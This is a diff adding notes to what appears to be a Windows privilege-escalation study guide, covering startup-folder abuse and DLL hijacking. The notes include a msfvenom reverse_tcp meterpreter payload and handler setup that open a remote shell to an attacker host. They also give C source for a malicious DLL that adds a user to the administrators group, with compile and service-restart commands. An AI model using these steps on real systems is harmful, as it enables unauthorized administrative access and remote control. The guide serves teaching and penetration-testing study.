@@ -202,14 +202,71 @@
 - More on: https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
 - Detailed on: https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10
 
-## Escalation Path: Executable Files
+## Escalation Path: Executable Services
 
 ## Escalation Path: Startup Applications
+- Startup applicatins are similar to autoruns that we perform. When we boot up our machine, an application is going to startup.
+- We will use icacls, it will look at the permissions of ACLs and allow us to see where we might have access.
+- `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
+- From the output notice that the `BUILTIN\Users` group has full access '(F)' to the directory.
+- Exploitation
+	- Create a payload
+	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker-ip -f exe -o x.exe`
+  - Copy the generated file, x.exe, to the Windows VM.
+  - Place x.exe in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup`
+  - Open Metasploit
+  	- `use multi/handler/`
+  	- `set payload windows/meterpreter/reverse_tcp`
+  	- `set lhost <attacker-ip>`
+  		- `run`
+  - Log off and Login.
+- icacls Documentation: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
 
 ## Escalation Path: DLL Hijacking
+- DLL are libraries that contain code annd procedures used by Windows programs similar to .so (Shared Library) files in Unix.
+- DLL hijacking is a method of injecting malicious code into a given service or application by loading an evil DLL, often replacing the originnal one, that will be executed when the service starts.
+- If the application or service runs with administrative privileges, then the attacker can be able to run malicious DLL with elevated privileges.
+- DLL Hijacking happens in two conditions.
+	- Absolute Path
+		- If the service has an absolute path, check if the path is writeable and place a malicious DLL file in the absolute path. 
+	- Undefined Path
+		- The directory from which the application loaded
+    - C:\Windows\System32
+    - C:\Windows\System
+    - C:\Windows
+    - The current working directory
+    - The directories that are listed in the PATH environment variable.
+		- If the service has an undefined path, check all the paths mentioned above and determine if any of them is writeable and place a malicious DLL file in the writeable path.
+-Discovery
+	- Open the Process Monitor Filter application
+	- Path -> Ends With -> .dll
+	- Result -> is -> NAME NOT FOUND.
+	- Apply
+- After find the .dll file which is writable or .dll which is not recognized. Note down the name of dll file and the path..
+- Create a Payload in C. Example: hijackme.dll
+```c
+# include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+	if (dwReason == DLL_PROCESS_ATTACH) {
+		system("cmd.exe /k net localgroup administrators user /add");
+		ExitProcess(0);
+	}
+	return TRUE;
+}
+```
+- Compile the program.
+	- `x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll`
+- Deliver the file to windows machine and replace the dll file.
+- Restart the dll service
+	- `sc stop dllsvc & sc start dllsvc`
+- `net localgroup administrators` - We now have new user added on administrative group.
+- For more DLL Hijacking: https://steflan-security.com/windows-privilege-escalation-dll-hijacking/
+- Even More: https://systemweakness.com/windows-privilege-escalation-hijacking-dlls-c2f26168bf37
 
 ## Escalation Path: Service Permissions (Paths)
 
 ## Escalation Path: CVE-2019-1388
 
-
+## References
+- https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
